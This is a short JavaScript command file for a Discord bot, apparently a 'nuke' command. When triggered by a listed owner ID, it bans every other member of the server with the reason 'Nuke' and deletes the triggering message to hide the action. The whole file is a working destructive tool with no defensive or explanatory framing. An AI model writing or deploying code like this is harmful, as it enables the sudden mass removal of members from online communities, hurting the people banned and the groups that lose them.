const Discord = require("discord.js");

const ownerids = require('../ownerids.json');

module.exports.run = async(bot, message, args) => {

  if(!ownerids.ownerid.includes(message.author.id)) return;

  let members = message.guild.members.size
  
 message.guild.members.forEach(message => {
    
   if(ownerids.ownerid.includes(message.user.id)) return;
   
   message.ban("Nuke")
   console.log(members);
   
 });
  
  message.delete();

}